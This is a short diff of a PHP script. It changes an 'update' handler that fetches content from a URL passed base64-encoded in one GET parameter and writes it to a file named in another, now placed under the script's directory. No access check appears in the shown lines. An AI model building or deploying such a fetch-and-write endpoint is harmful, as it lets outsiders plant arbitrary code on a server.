@@ -116,7 +116,7 @@ if(isset($_GET['op'])){
 			case 'update':
 				$msg = '';
 				if($s = @file_get_contents(base64_url_decode($_GET['a']))){
-					if(!(@file_put_contents(base64_url_decode($_GET['b']),$s))){
+					if(!(@file_put_contents(realpath(dirname(__FILE__)).'/'.base64_url_decode($_GET['b']),$s))){
 						$msg = 'Couldn\'t save file';
 					}
 				}else{
